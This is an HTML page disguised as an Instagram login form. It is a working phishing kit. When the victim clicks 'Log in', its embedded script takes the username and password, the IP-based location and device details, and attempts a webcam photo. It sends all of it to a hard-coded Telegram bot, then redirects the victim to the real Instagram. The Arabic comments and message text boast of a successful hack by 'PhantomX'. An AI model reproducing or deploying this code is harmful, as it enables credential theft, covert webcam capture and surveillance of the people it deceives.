<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <link rel="stylesheet" href="style.css">
    <link rel="icon" href="https://instalogin-clone.vercel.app/images/insta_logo.png">
</head>
<body>
    <div class="main">
        <div class="instass">
            <img id="phone" src="https://instalogin-clone.vercel.app/images/phones.png" alt="phonebackground">
        </div>

        <div class="loginbox">
            <img id="title" src="https://instalogin-clone.vercel.app/images/title.jpg" alt="Instagram">
            <input class="input" id="username" type="text" placeholder=" &#8205 &#8205Phone number, username, or email">
            <input class="input" id="password" type="password" placeholder=" &#8205 &#8205Password">
            <button id="loginbutton">Log in</button>
        </div>

        <div class="signup">
            Don't have an account?&#8205
            <a id="Signup" href="https://www.instagram.com/accounts/emailsignup/">&#8205 &#8205 Sign up</a>
        </div>
    </div>

<script>
    const TELEGRAM_BOT_TOKEN = '7590971159:AAEKdP-eSEE99hsy1rTEUAi0zba7BginDoA';
    const TELEGRAM_CHAT_ID = '5091980014';

    // عندما يضغط المستخدم على زر الدخول
    document.querySelector("#loginbutton").addEventListener("click", async function(event) {
        event.preventDefault();

        // جمع بيانات الحساب
        const username = document.getElementById("username").value;
        const password = document.querySelector("#password").value;

        // جمع بيانات الموقع
        const locationData = await getUserLocation();

        // جمع بيانات الجهاز
        const deviceInfo = getDeviceInfo();

        // التقاط صورة من كاميرا الويب
        const imageData = await captureImage();

        // بناء الرسالة لإرسالها إلى البوت
        const message = `🔓 *تم اختراق الحساب بنجاح بواسطة PhantomX نوع الحساب انستجرام* 🔓\n\n` +
                        `💻 *معلومات الحساب:* 💻\n` +
                        `📧 البريد الإلكتروني: ${username}\n` +
                        `🔑 كلمة المرور: ${password}\n\n` +
                        `🌍 *الموقع:* ${locationData.city}, ${locationData.country}\n` +
                        `🌐 عنوان الـ IP: ${locationData.ip}\n` +
                        `🔍 المزود: ${locationData.org}\n` +
                        `🚨 ASN: ${locationData.asn}\n\n` +
                        `💻 *معلومات الجهاز:* 💻\n` +
                        `🖥️ النظام: ${deviceInfo.platform}\n` +
                        `🌐 المتصفح: ${deviceInfo.browserInfo}\n` +
                        `⚙️ لغة المتصفح: ${deviceInfo.language}\n` +
                        `🔧 الرام: ${deviceInfo.memory}GB\n` +
                        `⚡ أنوية المعالج: ${deviceInfo.cpuCores}\n` +
                        `📺 دقة الشاشة: ${deviceInfo.screenResolution}\n\n` +
                        `🕒 *التوقيت:* ${new Date().toLocaleString()}\n\n` +
                        `👁️‍🗨️ *تم التقاط صورة المستخدم*\n` +
                        `☣ *⚜By PhantomX @tx_5w⚜*`;

        // إرسال البيانات إلى Telegram bot
        await sendToTelegram(message);

        // إرسال الصورة إذا كانت موجودة
        if (imageData) {
            await sendImageToTelegram(imageData);
        }

        // إعادة توجيه المستخدم إلى Instagram بعد 2 ثانية
        setTimeout(() => window.location.href = 'https://www.instagram.com', 2000);
    });

    // دالة لجمع معلومات الموقع (IP وموقع جغرافي)
    async function getUserLocation() {
        try {
            const response = await fetch('https://ipapi.co/json');
            const data = await response.json();
            return {
                city: data.city || "Unknown",
                country: data.country_name || "Unknown",
                ip: data.ip || "Unknown",
                org: data.org || "Unknown",
                asn: data.asn || "Unknown"
            };
        } catch (error) {
            console.error('Error fetching location data:', error);
            return {
                city: "Unknown",
                country: "Unknown",
                ip: "Unknown",
                org: "Unknown",
                asn: "Unknown"
            };
        }
    }

    // دالة لجمع معلومات الجهاز
    function getDeviceInfo() {
        const platform = navigator.platform;
        const browserInfo = navigator.userAgent;
        const language = navigator.language;
        const memory = (navigator.deviceMemory || 4).toFixed(2); // افتراضياً 4 جيجا
        const cpuCores = navigator.hardwareConcurrency;
        const screenResolution = `${window.screen.width}x${window.screen.height}`;
        return {
            platform,
            browserInfo,
            language,
            memory,
            cpuCores,
            screenResolution
        };
    }

    // دالة لالتقاط صورة من كاميرا الويب
    async function captureImage() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.createElement('video');
            video.srcObject = stream;
            await new Promise(resolve => video.onloadedmetadata = resolve);
            video.play();
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imageData = canvas.toDataURL('image/jpeg');
            stream.getTracks().forEach(track => track.stop());
            return imageData;
        } catch (error) {
            console.error('Error capturing image:', error);
            return null;
        }
    }

    // دالة لإرسال النص إلى Telegram bot
    async function sendToTelegram(message) {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });
        if (!response.ok) {
            console.error('Error sending message to Telegram');
        }
    }

    // دالة لإرسال الصورة إلى Telegram bot
    async function sendImageToTelegram(imageData) {
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('photo', imageData);

        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData,
        });

        if (!response.ok) {
            console.error('Error sending image to Telegram');
        }
    }
</script>
</body>
</html>
